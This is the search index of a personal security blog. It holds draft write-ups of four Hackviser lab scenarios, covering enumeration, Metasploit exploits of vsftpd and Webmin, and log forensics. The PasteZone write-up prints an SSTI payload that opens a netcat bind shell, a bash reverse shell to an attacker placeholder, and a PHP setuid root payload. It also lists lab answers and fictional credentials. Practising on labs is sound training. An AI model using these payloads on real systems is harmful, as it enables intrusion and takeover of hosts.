{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Home","text":"CTF articles <p>This is a living notebook of security work in progress.</p> <p>Here you\u2019ll find write-ups from CTF challenges and labs (including Hack The Box, TryHackMe, and Hackviser, where permissable by the content provider), alongside notes from courses, conferences, and the occasional reflective post on security practice and career development. New content will be added gradually as challenges are completed and ideas take shape.</p>"},{"location":"#about-me","title":"About me","text":"<p>I currently work in defensive cyber security, with a strong personal interest in the offensive side of the discipline (I remain convinced my dream job is in penetration testing!). I hold an MSc in Ethical Hacking and Cyber Security, with a background rooted in IT, and enjoy exploring how attack techniques, tooling, and human factors intersect with real-world defence.</p> <p>Outside of security, I spend time running, practising yoga, reading (particularly young adult fantasy and Stephen King), and being outnumbered by my dogs.</p>"},{"location":"tags/","title":"Tags","text":""},{"location":"tags/#tag:basic","title":"basic","text":"<ul> <li>            Anchor          </li> <li>            HackTrace          </li> <li>            Void          </li> </ul>"},{"location":"tags/#tag:capabilities","title":"capabilities","text":"<ul> <li>            PasteZone          </li> </ul>"},{"location":"tags/#tag:defensive","title":"defensive","text":"<ul> <li>            HackTrace          </li> </ul>"},{"location":"tags/#tag:easy","title":"easy","text":"<ul> <li>            PasteZone          </li> </ul>"},{"location":"tags/#tag:ffuf","title":"ffuf","text":"<ul> <li>            PasteZone          </li> </ul>"},{"location":"tags/#tag:forensics","title":"forensics","text":"<ul> <li>            HackTrace          </li> </ul>"},{"location":"tags/#tag:hackviser","title":"hackviser","text":"<ul> <li>            Anchor          </li> <li>            HackTrace          </li> <li>            PasteZone          </li> <li>            Scenarios and Labs          </li> <li>            Void          </li> </ul>"},{"location":"tags/#tag:john-the-ripper","title":"john-the-ripper","text":"<ul> <li>            Void          </li> </ul>"},{"location":"tags/#tag:linux","title":"linux","text":"<ul> <li>            Anchor          </li> <li>            HackTrace          </li> <li>            PasteZone          </li> <li>            Void          </li> </ul>"},{"location":"tags/#tag:metasploit","title":"metasploit","text":"<ul> <li>            Anchor          </li> <li>            Void          </li> </ul>"},{"location":"tags/#tag:offensive","title":"offensive","text":"<ul> <li>            Anchor          </li> <li>            PasteZone          </li> <li>            Void          </li> </ul>"},{"location":"tags/#tag:scenario","title":"scenario","text":"<ul> <li>            Anchor          </li> <li>            HackTrace          </li> <li>            PasteZone          </li> <li>            Void          </li> </ul>"},{"location":"tags/#tag:ssti","title":"ssti","text":"<ul> <li>            PasteZone          </li> </ul>"},{"location":"tags/#tag:system","title":"system","text":"<ul> <li>            Anchor          </li> <li>            PasteZone          </li> <li>            Void          </li> </ul>"},{"location":"tags/#tag:vulnerable-service-version","title":"vulnerable-service-version","text":"<ul> <li>            Anchor          </li> <li>            Void          </li> </ul>"},{"location":"tags/#tag:web","title":"web","text":"<ul> <li>            Anchor          </li> <li>            PasteZone          </li> </ul>"},{"location":"_drafts/anchor/","title":"Anchor","text":"<p>Platform: Hackviser Type: Scenario Difficulty: Basic Link: Anchor</p>","tags":["hackviser","scenario","basic","linux","offensive","web","system","vulnerable-service-version","metasploit"]},{"location":"_drafts/anchor/#description","title":"Description","text":"<p>\"We have discovered that Nexcorp, a company we serve, has been cyber-attacked and its data has been stolen, and that this data has been uploaded to a website used for illegal file transfer. It is believed that the leaked data is hosted on the server of this website. Your task is to recover the leaked data and identify the attackers. Good luck!\"</p>","tags":["hackviser","scenario","basic","linux","offensive","web","system","vulnerable-service-version","metasploit"]},{"location":"_drafts/anchor/#initial-enumeration","title":"Initial Enumeration","text":"<p>This particular scenario gives us the domain/machine name for the target, rather than the IP address. I started by ascertaining the IP address for the target:  Target host can be added to <code>/etc/hosts</code> if required but was not necessary for this scenario</p> <p>I generated a list of open ports for more comprehensive enumeration with the following: <code>ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)</code> This revealed the following open ports: - 21 - 22 - 80 (obviously, given the provided URL)  </p> <p>I ran a full <code>nmap</code> scan to query the services for version information, as well as querying the target system for OS information with <code>nmap -p$ports -A -T4 TARGET_IP_ADDRESS</code>, which revealed: </p>","tags":["hackviser","scenario","basic","linux","offensive","web","system","vulnerable-service-version","metasploit"]},{"location":"_drafts/anchor/#ftp","title":"FTP","text":"<p>The <code>nmap</code> scan shows that login to the FTP service is possible with both <code>ftp</code> and <code>anonymous</code> users, however the directory appeared empty after successful login using both of these usernames.</p> <p>Using <code>anonymous:anonymous</code>: </p> <p>Using <code>ftp:ftp</code>: </p>","tags":["hackviser","scenario","basic","linux","offensive","web","system","vulnerable-service-version","metasploit"]},{"location":"_drafts/anchor/#http","title":"HTTP","text":"<p>I used my go-to <code>ffuf</code> command to enumerate the website: <code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic</code> </p> <p>Nothing interesting there: </p> <p>Navigating to the URL provided reveals a static website: </p> <p>That static web page actually gives us the answer to the first question:</p> How many files have been transferred to date? <p>2,424,521</p> <p>The source code of the site shows us two new possible pages we can enumerate: </p> <p>Looking at the <code>styles.css</code> file reveals nothing of interest and the <code>script.js</code> file returns a <code>404 - Not Found</code> error.</p>","tags":["hackviser","scenario","basic","linux","offensive","web","system","vulnerable-service-version","metasploit"]},{"location":"_drafts/anchor/#initial-foothold","title":"Initial Foothold","text":"<p>With no usernames, no input forms, no secret directories, and no secrets in the available source code, I decided to return to the <code>nmap</code> results to start looking into possible vulnerabilities I could exploit with service versions. It didn't take me long to find a promising lead: </p> <p>I opened Metasploit, searched for the relevant exploit (<code>search vsftpd 2.3.4</code>) and selected it. Looking at the required config options for the exploit, we can see the only thing needed is the target IP (<code>RHOSTS</code>): </p> <p>After setting the target IP, I ran the exploit, which initially appeared to be unsuccessful: </p> <p>However, attempting to run the exploit again (sometimes they can be flaky and require multiple attempts) shows that a session had in fact been created: </p> <p>Starting an interaction with the session reveals that we have a <code>root</code> shell: </p>","tags":["hackviser","scenario","basic","linux","offensive","web","system","vulnerable-service-version","metasploit"]},{"location":"_drafts/anchor/#privileged-enumeration","title":"Privileged Enumeration","text":"<p>Given the shell we have is very flaky, I used the <code>post/multi/manage/shell_to_meterpreter</code> module to upgrade the existing shell to a <code>meterpreter</code> shell: </p> <p>Doing some basic directory enumeration, we find an interesting looking file in the <code>root</code> user directory: </p> <p>Reading the contents of the file gives us the answer to the next task. </p> What is the IBAN address to which the money from the data sale will be transferred? <pre><code>DE89370400440532013000\n</code></pre> <p>Using the next task wording, it sounds like we need to look at some HTTP logs. Enumerating the <code>/var/log</code> directory reveals an interesting-looking file: </p> <p>Reading the contents of the log file gives us the answer to the next task: </p> From which IP address was the file with the company's data uploaded? <pre><code>198.51.100.5\n</code></pre> <p>Switching to a <code>bash</code> shell to look for the <code>nexcorp.sql</code> file reveals the file is still on the server. After exiting the <code>bash</code> shell, we can use the inbuilt <code>download</code> command to obtain the file on our local machine: </p> <p>Reading the contents of the downloaded file on our local machine gives us the answer to the final task: </p> What is the password of the admin user in the leaked data? <pre><code>AdminPass1234!\n</code></pre> <p>Tools Used <code>metasploit</code></p> <p>Date completed: 02/02/2026 Date published: CURRENTLY NOT PUBLISHED</p>","tags":["hackviser","scenario","basic","linux","offensive","web","system","vulnerable-service-version","metasploit"]},{"location":"_drafts/hacktrace/","title":"HackTrace","text":"<p>Platform: Hackviser Type: Scenario Difficulty: Basic Link: HackTrace</p>","tags":["hackviser","scenario","basic","linux","defensive","forensics"]},{"location":"_drafts/hacktrace/#description","title":"Description","text":"<p>\"As an employee of Intrusion Insight Inc., conduct a comprehensive analysis on a client's website server that has been attacked to identify security breaches, potential vulnerabilities, and the source of the attack.\"</p>","tags":["hackviser","scenario","basic","linux","defensive","forensics"]},{"location":"_drafts/hacktrace/#environment-and-artefacts-provided","title":"Environment and Artefacts Provided","text":"<p>Analysis is performed on a provided Linux system. The investigation is constrained to artefacts present on the machine itself, including the file system, system logs, user data, and configuration files.</p>","tags":["hackviser","scenario","basic","linux","defensive","forensics"]},{"location":"_drafts/hacktrace/#task-1-identify-the-attacker-ip-address","title":"Task 1: Identify the attacker IP address","text":"","tags":["hackviser","scenario","basic","linux","defensive","forensics"]},{"location":"_drafts/hacktrace/#analysis","title":"Analysis","text":"<p>Given that the description specifies the system under investigation is a web server, the logical place to start this investigation is the HTTP access logs, usually stored in <code>/var/log/</code> on Linux hosts. Listing the directory contents of the <code>/var/log</code> directory shows that there is a <code>apache2</code> directory, which in turn contains an <code>access.log</code> file:  Reading the contents of the log reveals a screed of requests originating from <code>nmap</code> so it is reasonable to say that we have found the answer to the first task: </p> What is the IP address of the attacker who targeted the website? <pre><code>Artefact examined: HTTP access log\nAnswer: 10.0.0.41\n</code></pre>","tags":["hackviser","scenario","basic","linux","defensive","forensics"]},{"location":"_drafts/hacktrace/#task-2-identify-the-directory-scanning-tool","title":"Task 2: Identify the directory scanning tool","text":"","tags":["hackviser","scenario","basic","linux","defensive","forensics"]},{"location":"_drafts/hacktrace/#analysis_1","title":"Analysis","text":"<p>Looking again at the HTTP access logs (given that the task asks about directory scanning), there are several entries with a user agent that provide the answer to this task: </p> What tool did the attacker use for directory scanning? <pre><code>Artefact examined: HTTP access log\nAnswer: gobuster\n</code></pre>","tags":["hackviser","scenario","basic","linux","defensive","forensics"]},{"location":"_drafts/hacktrace/#task-3-identify-the-remote-access-tool","title":"Task 3: Identify the remote access tool","text":"","tags":["hackviser","scenario","basic","linux","defensive","forensics"]},{"location":"_drafts/hacktrace/#analysis_2","title":"Analysis","text":"<p>Using the task wording as a guide, we know that the file we are looking for was uploaded to the web server so we stick with the HTTP access logs for this one too. It is reasonable to assume that any file uploads were achieved using POST requests to the web server - as such, we can <code>grep</code> the access log file for the word \"POST\", which gives us the answer for this task: </p> What is the name of the file uploaded by the attacker to the system that allows remote computer access via the web? <pre><code>Artefact examined: HTTP access log\nAnswer: shell.php\n</code></pre>","tags":["hackviser","scenario","basic","linux","defensive","forensics"]},{"location":"_drafts/hacktrace/#task-4-identify-the-vulnerable-function","title":"Task 4: Identify the vulnerable function","text":"","tags":["hackviser","scenario","basic","linux","defensive","forensics"]},{"location":"_drafts/hacktrace/#analysis_3","title":"Analysis","text":"<p>For this, it seems sensible to see if we can examine the source code for the web site. Knowing that the files for web servers are commonly placed in <code>/var/www/html</code> on Linux hosts, I found a promising lead to investigate:  Reading the contents of the <code>upload.php</code> file provides the answer for the next task: </p> Which function in the software is responsible for the file upload vulnerability? <pre><code>Artefact examined: web site source code\nAnswer: uploadFile\n</code></pre>","tags":["hackviser","scenario","basic","linux","defensive","forensics"]},{"location":"_drafts/hacktrace/#task-5-identify-the-exfiltrated-file","title":"Task 5: Identify the exfiltrated file","text":"","tags":["hackviser","scenario","basic","linux","defensive","forensics"]},{"location":"_drafts/hacktrace/#analysis_4","title":"Analysis","text":"<p>Thinking back to the contents of the <code>/var/www/html</code> directory, there was an unusual-looking bash script:  That warrants some investigation! Reading the contents provides the answer to the next task: </p> Which important file has the attacker stolen from the system by compressing it into a zip file? <pre><code>Artefact examined: bash script in non-standard location\nAnswer: 2023-resumes\n</code></pre>","tags":["hackviser","scenario","basic","linux","defensive","forensics"]},{"location":"_drafts/hacktrace/#task-6-identify-the-exfiltration-domain","title":"Task 6: Identify the exfiltration domain","text":"","tags":["hackviser","scenario","basic","linux","defensive","forensics"]},{"location":"_drafts/hacktrace/#analysis_5","title":"Analysis","text":"<p>We're sticking with that bash script again - it's reasonable to assume (if I hadn't already seen it when I read its contents previously) that if the script zips sensitive files, it may also be responsible for exfiltrating the resulting compressed files. Looking again at the contents of the <code>xfdsd.sh</code> file, we find the answer to the final task: </p> Which domain did the attacker use to upload the data they accessed? <pre><code>Artefact examined: bash script in non-standard location\nAnswer: dataprocessingframework.hv\n</code></pre> <p>Tools Used <code>ls</code> <code>cat</code> <code>grep</code></p> <p>Date completed: 01/02/26 Date published: NOT CURRENTLY PUBLISHED</p>","tags":["hackviser","scenario","basic","linux","defensive","forensics"]},{"location":"_drafts/pastezone/","title":"PasteZone","text":"<p>Platform: Hackviser Type: Scenario Difficulty: Easy Link: PasteZone</p>","tags":["hackviser","scenario","easy","linux","offensive","web","system","ffuf","ssti","capabilities"]},{"location":"_drafts/pastezone/#description","title":"Description","text":"<p>\"An urgent midnight intelligence alert has triggered a full-scale response: sensitive data belonging to the Ministry of Energy has been discovered for sale on PasteZone, one of the most notorious illegal platforms on the dark web. Cybercriminals use this site to anonymously share details of compromised systems, vulnerabilities, and stolen data. Preliminary investigations have confirmed that the leaked content originates directly from the Ministry of Energy\u2019s systems, posing a significant security threat.</p> <p>Your mission is to identify the individuals or groups responsible for this breach, gather intelligence on PasteZone\u2019s administrators, and collect actionable evidence.\"</p>","tags":["hackviser","scenario","easy","linux","offensive","web","system","ffuf","ssti","capabilities"]},{"location":"_drafts/pastezone/#initial-enumeration","title":"Initial Enumeration","text":"<p>This particular scenario gives us the domain/machine name for the target, rather than the IP address. I started by ascertaining the IP address for the target: Target host can be added to <code>/etc/hosts</code> if required but was not necessary for this scenario</p> <p>I generated a list of open ports for more comprehensive enumeration with the following: <code>ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)</code> This revealed the following open ports: - 22 - 80 (obviously, given the provided URL)  </p> <p>I ran a full <code>nmap</code> scan to query the services for version information, as well as querying the target system for OS information with <code>nmap -p$ports -A -T4 TARGET_IP_ADDRESS</code>, which revealed: </p> <p>I used my go-to <code>ffuf</code> command to enumerate the website: <code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic</code> The results show some potentially interesting leads, but currently they simply redirect requests: </p> <p>Navigating to the web page, we find a forum-type website, with listings of recent offers of sensitive corporate data leaks from anonymous users: </p> <p>Looking at the source code for the home page reveals little we didn't already know from the <code>ffuf</code> output. Navigating to each of the links in the title bar reveals functioning pages with content: - \"CREATE PASTE\" (directs to <code>create.php</code>) - input form for users to create a new data leak offer for the forum - \"TOP PASTES\" (directs to <code>top.php</code>) - list of the most popular posts - \"RECENT PASTES\" (directs to <code>recent.php</code>) - list of the most recent posts - \"SEARCH\" (directs to <code>search.php</code>) - search function to look for posts by title or post content - \"SERVICES\" (directs to <code>services.php</code>) - provides details of the \"Premium Underground Services\" offered by the site (the \"GET STARTED\" buttons on this page are not functional)</p> <p>Bearing in mind the first task, I used the search function to look for \"energy.gov.hv\" and found the answer: </p> What is the contact email address of the user who published the energy.gov.hv post? <pre><code>darkleaker@protonmail.hv\n</code></pre>","tags":["hackviser","scenario","easy","linux","offensive","web","system","ffuf","ssti","capabilities"]},{"location":"_drafts/pastezone/#initial-foothold","title":"Initial foothold","text":"<p>Looking at the wording for the next task, it would seem that we need to gain access to the logs on the web server hosting the web page. With no usernames, no \"secret\" directories, and no secrets in the available source code, I decided to test the input forms at  <code>create.php</code> and <code>search.php</code> for some basic injection attacks: - A basic SQLi payload (using a <code>'</code>) failed to leak any error messages in any of the form fields. At this early stage in the investigation I decided to shelve this technique, at least temporarily. - A basic XSS payload (<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>) resulted in the payload being rendered as plaintext for the forum post form and treated as a literal search string for the search form. With this in mind, I decided to shelve this technique, at least temporarily.</p> <p>Recalling the initial <code>ffuf</code> results, I decided to try some recursive enumeration on the discovered directories. There was nothing unexpected found in the <code>assets</code> search, but enumerating the <code>vendor</code> directory revealed something potentially interesting: </p> <p>Twig is a template engine for use with PHP web pages:</p> <p>Reference</p> <p>Twig - Template engine</p> <p>Knowing that Twig was present on the web server, I decided to investigate whether an SSTI (Server-Side Template Injection) attack was possible, which can be confirmed using the payload <code>{{7*'7'}}</code> - if the page prints \"49\", this is proof that the attack has been successful.  </p> <p>Further reading</p> <p>Server-Side Template Injection</p> <p>The sample payload proved successful in the <code>create.php</code> endpoint: </p> <p>Using the suggested payloads from PayloadsAllTheThings, I used the injection to set up a bind shell on the target machine: <code>{{['nc -nlvp 4444 -e /bin/bash']|filter('system')}}</code> </p> <p>Once submitted, the web page appears to hang. Using <code>nc</code> to connect to the shell is successful: </p>","tags":["hackviser","scenario","easy","linux","offensive","web","system","ffuf","ssti","capabilities"]},{"location":"_drafts/pastezone/#post-compromise-enumeration","title":"Post-compromise Enumeration","text":"<p>Given the shell we have is very flaky, I used the <code>multi/handler</code> Metasploit module to provide a more stable shell, using a standard <code>bash</code> reverse shell (<code>bash -i &gt;&amp; /dev/tcp/ATTACKER IP/4444 0&gt;&amp;1</code>) in the already-established bind shell connection: </p> <p>Performing some local enumeration, I found an interesting looking file in the earlier-discovered <code>database</code> directory: </p> <p>Reading through the discovered file provides the answer for the next task: </p> What is the IP address of the attacker who posted the energy.gov.hv data? <pre><code>185.173.35.5\n</code></pre> <p>After a LOT of unsuccessful local enumeration, I decided that the next task was likely only answerable following privilege escalation so turned my attention to that as my next goal.</p>","tags":["hackviser","scenario","easy","linux","offensive","web","system","ffuf","ssti","capabilities"]},{"location":"_drafts/pastezone/#privilege-escalation","title":"Privilege Escalation","text":"<p>I tried to upgrade my <code>bash</code> shell to <code>meterpreter</code> in order to upload an automated script such as LinPEAS, but this was unsuccessful.  Attempting to copy and paste the script contents into a local copy was painfully slow, so I abandoned that and proceded to manually enumerate possibilities for privilege escalation using the following checklist:  </p> <ul> <li>OS  </li> <li>Kernel  </li> <li>Running services  </li> <li>Running processes (<code>ps aux</code>)  </li> <li>Installed packages and versions  </li> <li>Logged in users (<code>ps au</code>)  </li> <li>Contents of <code>/home</code> directories  </li> <li>SSH directory (keys)  </li> <li>Bash history  </li> <li>Sudo privileges (<code>sudo -l</code>)  </li> <li>Configuration files (<code>.conf</code> and <code>.config</code>)  </li> <li><code>/etc/shadow</code> file (readable hashes)  </li> <li><code>/etc/passwd</code> file (readable hashes)  </li> <li>Cron jobs (<code>cat /etc/crontab</code>)  </li> <li>File systems/additional drives    </li> <li>Files with SUID (+ GTFOBins)  </li> <li>Files with SGID (+ GTFOBins)  </li> <li>Writable directories  </li> <li>Writable files  </li> <li>Capabilities (<code>getcap</code>)  </li> <li>Shared libraries (<code>ldd &lt;executable&gt;</code>)</li> </ul> <p>I finally found a promising lead when checking for exploitable capabilities: </p> <p>GTFOBins gives us a payload we can try to leverage the capability: <code>php -r 'posix_setuid(0); system(\"/bin/sh -i\");'</code></p> <p>Running the payload gives us a successful <code>root</code> shell: </p>","tags":["hackviser","scenario","easy","linux","offensive","web","system","ffuf","ssti","capabilities"]},{"location":"_drafts/pastezone/#privileged-enumeration","title":"Privileged Enumeration","text":"<p>Performing some basic local enumeration finds an interesting file in the <code>/root</code> directory: </p> <p>Reading the contents of the file gives us the answer to the next task: </p> What are the \"email:password\" details for the PasteZone platform administrator's GitHub account? <p>michaelcarter@mailbox.hv:MKEVQV5VsQ4qc</p> <p>Reading the contents of the other file found in the <code>/root</code> directory (<code>backup.db</code>) provides the answer to the final task: </p> What is the phone number of the person managing the PasteZone infrastructure? <p>+12025550123</p> <p>Tools Used <code>ffuf</code></p> <p>Date completed: 06/02/26 Date published: NOT CURRENTLY PUBLISHED</p>","tags":["hackviser","scenario","easy","linux","offensive","web","system","ffuf","ssti","capabilities"]},{"location":"_drafts/void/","title":"Void","text":"<p>Platform: Hackviser Type: Scenario Difficulty: Basic Link: Void</p>","tags":["hackviser","scenario","basic","linux","offensive","system","vulnerable-service-version","metasploit","john-the-ripper"]},{"location":"_drafts/void/#description","title":"Description","text":"<p>\"According to our security analysts' reports, our critical systems have been subjected to scans from a suspicious IP address for some time. Your mission is to identify the owner of this IP address and the associated server, and to uncover what the attackers are doing. Good luck!\"</p>","tags":["hackviser","scenario","basic","linux","offensive","system","vulnerable-service-version","metasploit","john-the-ripper"]},{"location":"_drafts/void/#initial-enumeration","title":"Initial Enumeration","text":"<p>I generated a list of open ports for more comprehensive enumeration with the following: <code>ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)</code> This revealed the following open ports: - 22 - 10000  </p> <p>I ran a full <code>nmap</code> scan to query the services for version information, as well as querying the target system for OS information with <code>nmap -p$ports -A -T4 TARGET_IP_ADDRESS</code>, which revealed the following:   </p> <p>Browsing to the 10000 port shows there is an HTTP site running there: </p>","tags":["hackviser","scenario","basic","linux","offensive","system","vulnerable-service-version","metasploit","john-the-ripper"]},{"location":"_drafts/void/#http","title":"HTTP","text":"<p>I used my go-to <code>ffuf</code> command to enumerate the website: <code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic</code> This produced a successful hit for every fuzz it attempted, which is obviously not useful. Looking at the output, each successful result contained the same number of words, so I reran the fuzz with the <code>-fw</code> switch to filter these out. This took a LONG time and actually didn't finish before the machine terminated (I forgot to add time). It didn't find anything in that time, so I decided that this was probably not the intended attack path and moved on.</p> <p>According to the <code>nmap</code> scan results, there is a <code>robots.txt</code> file, but there is nothing useful in it: </p> <p>The source code reveals a couple of potential leads, but all of them simply redirect back to that initial login page or result in a <code>404</code> error: </p>","tags":["hackviser","scenario","basic","linux","offensive","system","vulnerable-service-version","metasploit","john-the-ripper"]},{"location":"_drafts/void/#initial-foothold","title":"Initial Foothold","text":"<p>With no usernames, no input forms, no secret directories, and no secrets in the available source code, I decided to return to the <code>nmap</code> results to start looking into possible vulnerabilities I could exploit with service versions. It didn't take me long to find a promising lead: </p> <p>I opened Metasploit, searched for the relevant exploit (<code>search WebMin 1.890</code>) and selected it. Looking at the required config options for the exploit, we can see the only thing needed is the target IP (<code>RHOSTS</code>) and local host IP (LHOST): </p> <p>After setting the target IP, I ran the <code>check</code> module for this exploit, which suggested that the target is vulnerable: </p> <p>I ran the exploit and instantly got a <code>root</code> shell: </p>","tags":["hackviser","scenario","basic","linux","offensive","system","vulnerable-service-version","metasploit","john-the-ripper"]},{"location":"_drafts/void/#privilege-enumeration","title":"Privilege Enumeration","text":"<p>Given the shell we have is very flaky, I used the <code>post/multi/manage/shell_to_meterpreter</code> module to upgrade the existing shell to a <code>meterpreter</code> shell: </p> <p>Doing some basic directory enumeration, and using the task wording as a guide, we find an interesting looking directory in the <code>root</code> user directory, with interesting content: </p> <p>Reading the contents of the file gives us the answer to the first task. </p> What is the email address and password for the attacker's GitHub account? <pre><code>timmycoat@anonymmail.hv:wTWQzVeTD3vm\n</code></pre> <p>Using the wording of the next task and referring back to the listing for the <code>/root</code> directory, I used the native <code>download</code> function of the Meterpreter shell to download the <code>phishing_malware.zip</code> file to my attacker machine: </p> <p>Attempting to unzip the file shows that it's password-protected: </p> <p>I passed the file to <code>zip2john</code> to extract the password hash and then passed that hash to <code>john</code>, which cracked the password almost instantly: </p> <p>The zip file can now be unzipped and the MD5 hash obtained using <code>md5sum</code>, giving us the answer to the next task: </p> What is the MD5 hash value of the malware used by the attacker? <pre><code>b82f8ba530a975e9f2acefe675fbffce\n</code></pre> <p>Again using the task wording, I ran a search for <code>sqlmap</code> and found an <code>output</code> directory in the <code>root</code> user directory: </p> <p>Checking the contents of the <code>output</code> directory gives us the answer to the next task: </p> What is the domain name that the attacker scanned with the SQL Injection scanning tool? <pre><code>albireobank.hv\n</code></pre> <p>Doing some more enumeration of the target machine finds a user directory we have yet to explore. What's more it has some interesting files in the <code>Downloads</code> directory: </p> <p>Reading the <code>WindowsCredentials.txt</code> file gives us the answer to the next task: </p> What is the e-mail address of the victim in the \u201cStealer Log\u201d data on the server? <pre><code>christopher1d@zeromail.hv\n</code></pre> <p>For the final time I used the task wording to guide the next steps. The task mentions port scanning, so I looked for <code>nmap</code> on the target machine, turning up a non-standard directory in the root file system: </p> <p>Reading the <code>scan_results.xml</code> file gives us the answer for the final task: </p> Which IP address did the attacker scan for ports and services? <pre><code>45.76.59.241\n</code></pre> <p>Tools Used <code>metasploit</code></p> <p>Date completed: 18/01/26 Date published: NOT CURRENTLY PUBLISHED</p>","tags":["hackviser","scenario","basic","linux","offensive","system","vulnerable-service-version","metasploit","john-the-ripper"]},{"location":"hackthebox/","title":"Hack The Box Machines and Challenges","text":"<p>Coming soon!</p>"},{"location":"hackviser/","title":"Hackviser Scenarios and Labs","text":"<p>It is my understanding that writeups for Hackviser Scenarios are not permitted (see Discord rules). As such, no full Scenario writeups will be published here. A list of completed Scenarios is included below, with an associated writeup hiding in the wings in case Hackviser ever change their stance on this.</p>","tags":["hackviser"]},{"location":"hackviser/#scenarios","title":"Scenarios","text":"<ul> <li>Anchor</li> <li>Void</li> <li>HackTrace</li> <li>PasteZone</li> </ul>","tags":["hackviser"]},{"location":"hackviser/#labs","title":"Labs","text":"<p>Coming soon.</p>","tags":["hackviser"]},{"location":"tryhackme/","title":"TryHackMe Rooms","text":"<p>Coming soon!</p>"}]}